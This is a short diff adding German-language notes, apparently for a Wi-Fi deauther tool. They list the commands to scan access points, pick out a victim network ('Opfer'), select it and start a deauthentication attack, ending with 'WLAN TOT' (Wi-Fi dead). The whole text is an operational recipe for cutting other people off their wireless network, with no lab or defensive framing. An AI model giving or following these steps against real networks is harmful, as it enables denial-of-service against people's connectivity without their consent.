@@ -1,0 +1,21 @@
+{scan ap}
+ok
+......
+zurück
+
+{list ... ap}
+ok
+(zahl vom Opfer AP[SSID] merken, z.b. 1)
+zurück
+ 
+{select ... ap}
+ok
+(gemerkte zahl einfügen z.b. select -a 1)
+auf save
+zurück
+zurück
+
+{attack ... deauth}
+ok
+
+WLAN TOT
